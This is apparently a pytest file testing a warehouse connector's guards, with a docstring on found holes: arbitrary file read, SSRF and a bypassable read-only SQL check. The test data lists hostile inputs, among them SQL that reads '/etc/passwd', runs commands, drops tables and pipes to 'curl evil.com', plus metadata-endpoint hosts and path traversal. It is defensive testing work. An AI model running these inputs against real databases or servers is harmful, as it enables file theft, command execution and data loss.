"""
The warehouse connector is the one place the SERVER makes a connection
to a host the CLIENT names, and runs SQL the CLIENT wrote. Both halves
had holes, and both were found by attacking the guards rather than
reading them.

**Arbitrary file read on the application server.** `sqlite` was a listed
backend, so `sqlite:////etc/passwd` built an engine and returned rows.
Any authenticated client could read any file the process could — other
tenants' stored datasets, the user store with its credential hashes, the
environment file with the API keys. Demonstrated against a database
holding a fake key, which came back in the result set.

**SSRF.** Nothing looked at the host. `169.254.169.254` is the cloud
metadata endpoint that hands out the instance's credentials, and
`127.0.0.1` reaches services the deployment never exposed.

**A read-only guard that five statements walked past.** It required the
query to start with SELECT or WITH and to carry no second statement.
Both are necessary; together they are nowhere near sufficient. The
rollback that was described as the second guard is a real guard against
DML and no guard at all against a file write or an auto-committing DDL.
"""
import os

import pytest

from app.services.warehouse import (WarehouseError, assert_dialable,
                                    assert_read_only, run_query)


# ══════════════════════════════════════════════════════════
#  Statements
# ══════════════════════════════════════════════════════════

@pytest.mark.parametrize("sql,why", [
    ("WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x",
     "PostgreSQL data-modifying CTE — starts with WITH, deletes rows"),
    ("WITH x AS (SELECT 1) DELETE FROM users",
     "a DELETE hidden behind a leading CTE"),
    ("SELECT * INTO new_table FROM users",
     "a SELECT that creates a table"),
    ("SELECT * FROM users INTO OUTFILE '/tmp/pwned.txt'",
     "MySQL writes a file on the database server, outside the transaction"),
    ("SELECT lo_import('/etc/passwd')",
     "PostgreSQL large-object import reads a server-side file"),
    ("SELECT pg_read_file('/etc/passwd')", "direct server file read"),
    ("SELECT * FROM x WHERE 1=1 AND sys_exec('id')", "command execution"),
    ("select pg_sleep(600)", "holds the connection open"),
    ("SELECT 1; DROP TABLE users", "a second statement"),
    ("COPY users TO PROGRAM 'curl evil.com'", "does not start with SELECT"),
])
def test_a_statement_that_is_not_a_read_is_refused(sql, why):
    with pytest.raises(WarehouseError):
        assert_read_only(sql)


@pytest.mark.parametrize("sql", [
    "SELECT * FROM orders WHERE region = 'North'",
    "select customer_id, count(*) from events group by 1 order by 2 desc limit 100",
    "WITH recent AS (SELECT * FROM orders WHERE d > '2024-01-01') "
    "SELECT region, SUM(amount) FROM recent GROUP BY region",
    "SELECT a.id, b.name FROM a JOIN b ON a.id = b.a_id WHERE b.active",
    "SELECT 1",
])
def test_the_queries_this_tool_exists_for_still_run(sql):
    """A guard that blocks real work gets switched off, so this half
    matters as much as the half above."""
    assert_read_only(sql)


def test_the_refusal_names_what_it_objected_to():
    """"Refused" with no reason is a support ticket."""
    with pytest.raises(WarehouseError, match="DELETE"):
        assert_read_only("WITH x AS (SELECT 1) DELETE FROM users")


# ══════════════════════════════════════════════════════════
#  Connection URLs
# ══════════════════════════════════════════════════════════

def test_a_sqlite_path_is_not_a_warehouse(monkeypatch):
    """The one that mattered most: any file the process can read."""
    monkeypatch.delenv("WAREHOUSE_SQLITE_DIR", raising=False)
    with pytest.raises(WarehouseError, match="application's own disk"):
        assert_dialable("sqlite:////etc/passwd")


def test_sqlite_works_when_a_deployment_opts_in(tmp_path, monkeypatch):
    """Local and self-hosted use is legitimate — it just has to be
    something the deployment chose, inside a directory it named."""
    import sqlite3
    db = tmp_path / "warehouse.db"
    conn = sqlite3.connect(db)
    conn.execute("CREATE TABLE t (a INT)")
    conn.execute("INSERT INTO t VALUES (1)")
    conn.commit()
    conn.close()

    monkeypatch.setenv("WAREHOUSE_SQLITE_DIR", str(tmp_path))
    result = run_query(f"sqlite:///{db}", "SELECT * FROM t", limit=10)
    assert len(result.df) == 1


@pytest.mark.parametrize("path", ["/etc/passwd", "{root}/../../etc/passwd"])
def test_an_opted_in_directory_cannot_be_escaped(tmp_path, monkeypatch, path):
    monkeypatch.setenv("WAREHOUSE_SQLITE_DIR", str(tmp_path))
    target = path.format(root=str(tmp_path))
    with pytest.raises(WarehouseError, match="outside the directory"):
        assert_dialable("sqlite:///" + target)


@pytest.mark.parametrize("host,label", [
    ("169.254.169.254", "cloud metadata — hands out instance credentials"),
    ("127.0.0.1",       "the app server's own loopback"),
    ("localhost",       "the same, behind a name — resolved before judging"),
    ("0.0.0.0",         "unspecified"),
])
def test_the_server_will_not_dial_its_own_network(host, label):
    with pytest.raises(WarehouseError):
        assert_dialable(f"postgresql+psycopg://u:p@{host}:5432/db")


def test_an_unknown_dialect_is_refused():
    """SQLAlchemy builds an engine for any dialect it can import. The
    list of what this server connects to is ours, not its."""
    with pytest.raises(WarehouseError, match="not a database type"):
        assert_dialable("duckdb:///:memory:")


def test_a_real_warehouse_url_is_accepted():
    assert_dialable("postgresql+psycopg://u:p@db.example.com:5432/analytics")


def test_a_private_host_is_allowed_by_default_and_refusable():
    """A warehouse inside the deployment's own VPC is the normal case,
    so private ranges pass by default — and a multi-tenant host can
    close them without touching code."""
    from app.config import config
    assert_dialable("postgresql+psycopg://u:p@10.0.1.20:5432/analytics")

    original = getattr(config, "warehouse_allow_private_hosts", True)
    try:
        config.warehouse_allow_private_hosts = False
        with pytest.raises(WarehouseError, match="private network"):
            assert_dialable("postgresql+psycopg://u:p@10.0.1.20:5432/analytics")
    finally:
        config.warehouse_allow_private_hosts = original
